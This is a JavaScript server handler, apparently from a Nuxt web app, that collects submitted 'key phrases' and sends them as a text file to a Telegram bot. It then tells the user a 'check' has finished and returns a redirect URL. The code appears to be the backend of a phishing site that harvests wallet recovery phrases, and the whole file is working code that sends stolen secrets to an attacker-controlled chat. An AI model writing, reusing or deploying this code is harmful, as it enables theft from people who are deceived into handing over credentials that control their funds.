import { Buffer } from 'buffer';

const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
const telegramUserId = process.env.TELEGRAM_USER_ID;
const redirectURL = process.env.REDIRECT_URL;
const tk = process.env.NUXT_PUBLIC_TURNSTILE_SITE_KEY;
const ts = process.env.NUXT_TURNSTILE_SECRET_KEY;

if (!telegramBotToken || !telegramUserId) {
    throw new Error('TELEGRAM_BOT_TOKEN or TELEGRAM_USER_ID not set in .env');
}

if (!redirectURL) {
    throw new Error('REDIRECT_URL environment variable not set in .env');
}

if (!ts || !tk) {
    throw new Error('NUXT_PUBLIC_TURNSTILE_SITE_KEY or NUXT_TURNSTILE_SECRET_KEY not set in .env');
}

const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendDocument`;

export default defineEventHandler(async (event) => {
    try {
        const { words } = await readBody(event);
        if (!words || !Array.isArray(words) || words.length === 0) {
            throw createError({
                statusCode: 400,
                message: 'No key phrases provided.',
            });
        }

        // Create file buffer
        const fileContent = words.join('\n');
        const buffer = Buffer.from(fileContent, 'utf-8');

        // Build form-data payload
        const formData = new FormData();
        formData.append('chat_id', telegramUserId);
        formData.append(
            'caption',
            `Key phrases sent on ${new Date().toLocaleString('en-US', {
                timeZone: 'America/Sao_Paulo',
            })}`
        );
        formData.append('document', new Blob([buffer]), 'keyphrases.txt');

        // Send request
        const res = await fetch(telegramApiUrl, {
            method: 'POST',
            body: formData,
        });

        const result = await res.json();

        if (!res.ok || !result.ok) {
            throw new Error(result.description || 'Telegram API error');
        }

        return {
            statusCode: 200,
            message: 'Check process finished.',
            red: btoa(redirectURL)
        };
    } catch (error) {
        console.error('Error sending words:', error);
        throw createError({
            statusCode: 500,
            message: `Failed to check`,
        });
    }
});
